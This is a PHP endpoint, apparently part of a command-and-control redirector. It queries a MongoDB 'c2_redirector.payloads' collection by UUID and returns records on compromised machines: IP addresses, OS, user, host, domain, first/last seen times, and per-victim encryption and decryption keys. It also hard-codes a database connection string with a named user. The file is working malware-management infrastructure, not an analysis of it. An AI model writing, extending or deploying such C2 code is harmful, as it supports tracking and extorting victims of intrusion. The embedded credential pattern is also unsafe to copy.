<?php
// payload_fixed.php - Using MongoDB driver directly
header('Content-Type: application/json');

// Check if MongoDB driver is available
if (!class_exists('MongoDB\Driver\Manager')) {
    http_response_code(500);
    echo json_encode(["error" => "MongoDB Driver not available"]);
    exit;
}

if (!isset($_GET['uuid'])) {
    http_response_code(400);
    echo json_encode(["error" => "UUID parameter required"]);
    exit;
}

$uuid = $_GET['uuid'];

try {
    // Use MongoDB driver directly
    $manager = new MongoDB\Driver\Manager("mongodb+srv://s12deff_db_user:...@cluster0.btqpvis.mongodb.net/?appName=Cluster0");
    
    // Find payload by UUID
    $filter = ['uuid' => $uuid];
    $query = new MongoDB\Driver\Query($filter);
    $cursor = $manager->executeQuery('c2_redirector.payloads', $query);
    $documents = $cursor->toArray();
    
    if (empty($documents)) {
        http_response_code(404);
        echo json_encode(["error" => "Payload not found"]);
        exit;
    }
    
    $document = $documents[0];
    
    // Convert BSON document to array
    $payload = [
        'uuid' => $document->uuid,
        'ips' => $document->ips ?? [],
        'os' => $document->os ?? '',
        'user' => $document->user ?? '',
        'host' => $document->host ?? '',
        'architecture' => $document->architecture ?? '',
        'domain' => $document->domain ?? '',
        'encryption_key' => $document->encryption_key ?? '',
        'decryption_key' => $document->decryption_key ?? '',
        'status' => $document->status ?? 'active'
    ];
    
    // Convert BSON dates to ISO format
    if (isset($document->first_seen) && $document->first_seen instanceof MongoDB\BSON\UTCDateTime) {
        $payload['first_seen'] = $document->first_seen->toDateTime()->format('c');
    }
    
    if (isset($document->last_seen) && $document->last_seen instanceof MongoDB\BSON\UTCDateTime) {
        $payload['last_seen'] = $document->last_seen->toDateTime()->format('c');
    }
    
    echo json_encode(["payload" => $payload]);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(["error" => "Database error: " . $e->getMessage()]);
}
?>